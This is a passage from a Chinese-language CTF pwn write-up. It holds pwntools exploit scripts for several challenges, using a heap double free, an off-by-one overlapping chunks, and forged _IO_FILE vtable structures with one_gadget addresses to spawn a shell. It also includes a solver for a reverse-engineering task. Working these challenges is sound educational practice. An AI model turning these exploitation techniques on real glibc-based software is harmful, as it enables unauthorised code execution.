            # libc = ELF('./libc_32.so.6')
            context.log_level = 'debug'
        # 0x555555554000
        # if ATTACH==1:
        #   gdb.attach(p,'''
        #   b *0x08048AC1
        #   ''')
        # add(idx,typ,value,size=0)
        # leak heap addr
        add(0,2,'aaaa\n',0x38)
        add(1,1,0x1234)
        delete(0)
        add(2,2,'aaaa\n',0x500)
        show(2)
        ru('Value=')
        heap_addr = int(ru(')')[:-1])
        log.info('heap addr: '+hex(heap_addr))
        heap_base = heap_addr-0x18
        log.info('heap base: '+hex(heap_base))
        add(3,2,'e3pem\n',0x38)
        # double free
        payload = 'a'*0x28+p32(0)+p32(0x41)+'\n'
        add(4,2,payload,0x38)
        add(5,2,'aaaa\n',0x38)
        add(6,1,0x1234)
        delete(4)
        delete(5)
        delete(4)
        payload=p32(heap_base+0xb0)+'\n'
        add(7,2,payload,0x38)
        add(8,2,'/bin/sh\x00\n',0x38)
        add(9,2,'aaaa\n',0x38)
        delete(1)
        if ATTACH==1:
            gdb.attach(p,'''
            b *0x08048AC1
            b *0x0804895A
            ''')
        payload = '\x00'*8+p32(0)+p32(0x11)+'sh\x00\x00'+p32(0x8048500)+p32(heap_base+0xd8)+'\x41'+'\n'
        add(10,2,payload,0x38)
        delete(8)
        # add(0,1,0x1234)
        # payload = 'e3pem\n'
        # add(2,2,payload,0xa0)
        p.interactive()
    if __name__ == '__main__':
        pwn()
### pwn4
libc 2.23的off-by-one，程序没有开`PIE`。可以很方便的构造堆块重叠，进而可以改在堆中的结构体，造成任意地址写（改got表、`_IO_list_all`等都可以）。
    from pwn import *
    context(arch = 'amd64', os = 'linux', endian = 'little')
    context.log_level = 'debug'
    def build(size, data):
        p.recvuntil('Your choice :')
        p.sendline('1')
        p.recvuntil(' nest ?')
        p.sendline(str(size))
        p.recvuntil('the nest?')
        p.send(data)
    def offbyone(idx, data):
        p.recvuntil('Your choice :')
        p.sendline('2')
        p.recvuntil('Index :')
        p.sendline(str(idx))
        p.recvuntil('the nest?')
        p.send(data)
    def show(idx):
        p.recvuntil('Your choice :')
        p.sendline('3')
        p.recvuntil('Index :')
        p.sendline(str(idx))
    def delete(idx):
        p.recvuntil('Your choice :')
        p.sendline('4')
        p.recvuntil('Index :')
        p.sendline(str(idx))
    def VTCBypassOneGadget(vtable_addr, one_gadget_addr, io_list_all_addr):
        exp = p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)
        exp += p64(0) + p64(1) + p64(0) + p64(0) + p64(0) + p64(0) * 6 + p64(0) + p64(0) * 4
        exp += p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(one_gadget_addr)
        return exp
    def GameStart(ip, port, debug):
        global p
        if debug == 1:
            p = process('./wood', env = {'LD_PRELOAD' : './libc.so.6'})
        else:
            p = remote(ip, port)
        libc = ELF('./libc.so.6')
        build(0x10, 'emmmmm')
        build(0x10, 'emmmmm')
        delete(0)
        delete(1)
        build(0x28, 'emmmm')
        build(0xf0, 'emmmm')
        build(0xe0, 'emmmm')
        offbyone(0, '\x00' * 0x28 + '\xf1')
        delete(1)
        build(0x300, '\x00' * 0xf0 + p64(0) + p64(0xf1) + '\x00' * 0xe0 + p64(0) + p64(0x21) + '\x00' * 0x10 + p64(0) + p64(0x21))
        delete(2)
        build(0xe0, 'a' * 8)
        show(2)
        p.recvuntil('aaaaaaaa')
        libc.address = u64(p.recvn(6) + '\x00' * 2) - libc.symbols['__malloc_hook'] - 0x10 - 0x58
        log.info('libc addr is : ' + hex(libc.address))
        delete(2)
        one_gadget = 0x45216
        one_gadget = 0x4526a
        # one_gadget = 0xf02a4
        # one_gadget = 0xf02b0
        # one_gadget = 0xf1147
        offbyone(1, '\x00' * 0xf0 + VTCBypassOneGadget(libc.address + 0x3C33F8, libc.address + one_gadget, libc.symbols['_IO_list_all']))
        # gdb.attach(p)
        p.recvuntil('Your choice :')
        p.sendline('1')
        p.recvuntil(' nest ?')
        p.sendline(str(0x100))
        p.interactive()
    if __name__ == '__main__':
        GameStart('172.1.2.10', 8888, 0)
## pwn-day2
### pwn2
输入666即可泄露libc地址，程序在读取`Author
name:`的时候多读了8字节，刚好覆盖了下一个字段，该字段为指针，这样就能实现任意地址写了。利用任意地址写来修改`stderror`结构体的vtable指针，指向我们可控的地方，exit触发虚表调用即可getshell
    from pwn import *
    p = None
    r = lambda x:p.recv(x)
    rl = lambda:p.recvline
    ru = lambda x:p.recvuntil(x)
    rud = lambda x:p.recvuntil(x,drop=True)
    s = lambda x:p.send(x)
    sl = lambda x:p.sendline(x)
    sla = lambda x,y:p.sendlineafter(x,y)
    sa = lambda x,y:p.sendafter(x,y)
    rn = lambda x:p.recvn(x)
    def add(length,name):
        sla('-> ',str(1))
        sla('Length: ',str(length))
        sa('name:',name)
    def pwn():
        global p
        BIN_PATH = './pwn'
        DEBUG = 0
        ATTACH = 0
        context.arch = 'amd64'
        if DEBUG == 1:
            p = process(BIN_PATH)
            elf = ELF(BIN_PATH)
            context.log_level = 'debug'
            context.terminal = ['tmux', 'split', '-h']
            if context.arch == 'amd64':
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        else:
            p = remote('172.1.2.4',8888)
            libc = ELF('./libc2.so')
            context.log_level = 'debug'
        # 0x555555554000
        if ATTACH==1:
            gdb.attach(p,'''
            b *0x555555554000+0xa77
            b *0xf30+0x555555554000
            ''')
        sla('-> \n',str(666))
        # print ru('\n')
        libc_base = int(ru('\n')[:-1],16)-libc.sym['puts']
        log.info('libc addr: '+hex(libc_base))
        # add
        payload = 'a'*8+p64(libc_base+libc.sym['_IO_2_1_stderr_'])
        add(0xe0,payload)
        sla('-> \n',str(2))
        sla('New ','e3pem')
        fake_file = ('/bin/sh\x00'+p64(0x61)+p64(0)+p64(libc.sym['_IO_list_all']-0x10)+p64(libc.sym['_IO_list_all'])+p64(libc.sym['_IO_list_all']+0x10))
        fake_file += p64(libc_base+libc.sym['_IO_2_1_stderr_']+56)+p64(0)*2+p64(libc_base+libc.sym['system'])*5+p64(0)*6+p64(0)+p64(0)*3+p64(0xffffffffffffffff)
        fake_file = fake_file.ljust(0xd8,'\x00')
        fake_file += p64(libc_base+libc.sym['_IO_2_1_stderr_']+8*6)
        payload = fake_file
        print hex(len(fake_file))
        sla('contents:\n',payload)
        ru('Over.')
        sla('-> \n',str(4))
        p.interactive()
    if __name__ == '__main__':
        pwn()
### pwn3
是一个逆向题目，输入24个字符，类似自动机一样处理数据。运算完之后和结果比对，若对于每个字符a，abs(a-target)<=1，就给你shell。
ida里可以提取十六进制，然后把他写个脚本转换为 long double型的数。
    # coding:utf-8
    from pwn import *
    con = remote("172.1.2.5",8888)
    con.recvuntil('Input something')
    target = [224.000000,60.000000,196.000000,119.000000,127.000000,179.000000,1.000000,77.000000,173.000000,109.000000,29.000000,111.000000,195.000000,194.000000,100.000000,108.000000,1.339806,60.000000,0.640625,42.000000,260.000000,44.529411,79.000000,143.000000]
    # 参数
    v11 = [0x1,0x10,0x25,0x3,0x0D,0x0A,0x2,0x0B,0x28,0x2,0x14,0x3F,0x1,0x17,0x3C,0x1,0x0,0x69,0x1,0x12,0x3F,0x2,0x0E,0x77,0x3,0x15,0x53,0x2,0x0E,0x7D,0x3,0x5,0x0A,0x2,0x4,0x55,0x2,0x15,0x33,0x2,0x15,0x5,0x1,0x5,0x2F,0x3,0x7,0x43,0x1,0x11,0x39,0x3,0x0D,0x27,0x1,0x5,0x1E,0x3,0x4,0x3C,0x1,0x13,0x1E,0x3,0x1,0x78,0x1,0x0,0x20,0x2,0x0F,0x53,0x3,0x14,0x2B,0x3,0x14,0x28,0x3,0x0A,0x19,0x3,0x12,0x60,0x1,0x5,0x7E,0x3,0x0F,0x20,0x1,0x0F,0x58,0x2,0x11,0x51,0x1,0x0B,0x24,0x1,0x17,0x79,0x1,0x0E,0x4A,0x3,0x10,0x67,0x2,0x16,0x5C,0x3,0x9,0x6D,0x1,0x17,0x30,0x2,0x0A,0x2C,0x3,0x7,0x3F,0x3,0x7,0x43,0x1,0x4,0x4,0x2,0x0,0x0F,0x1,0x2,0x63,0x2,0x3,0x70,0x1,0x8,0x7B,0x2,0x6,0x14C,0x2,0x0B,0x7A,0x1,0x0C,0x0D0,0x2,0x11,0x22,0x2,0x13,0x66,0x4,0x15,0x0BB,0x4,0x12,0x80,0x4,0x10,0x67,0x4,0x1,0x0D8,0x1,0x3,0x80,0x1,0x4,0x2,0x4,0x4,0x12,0x4,0x5,0x7,0x1,0x6,0x0DA,0x4,0x7,0x43,0x4,0x7,0x43,0x4,0x7,0x5A,0x2,0x8,0x42,0x4,0x9,0x5F,0x4,0x0A,0x59,0x1,0x0B,0x79,0x2,0x0C,0x6C,0x4,0x0D,0x0C3,0x1,0x0E,0x0AF,0x4,0x0F,0x0A,0x4,0x10,0x67,0x4,0x12,0x0C0,0x4,0x14,0x2B,0x4,0x14,0x8,0x1,0x16,0x6C,0x2,0x17,0x0D3]
    assert(len(target)==24)
    v11.reverse()
    # 三个一组
    for i in range(0,232,3):
        # 反向
        op_ = v11[i+2]
        index_ = v11[i+1]
        num_ = v11[i]
        if op_ == 2:
            target[index_] += num_
        if op_ == 3:
            target[index_] /= num_
        if op_ == 4:
            target[index_] *= num_
        if op_ == 1:
            target[index_] -= num_
    result = ''
    for op in target:
        result += chr(int(op))
    con.sendline(result)
    con.interactive()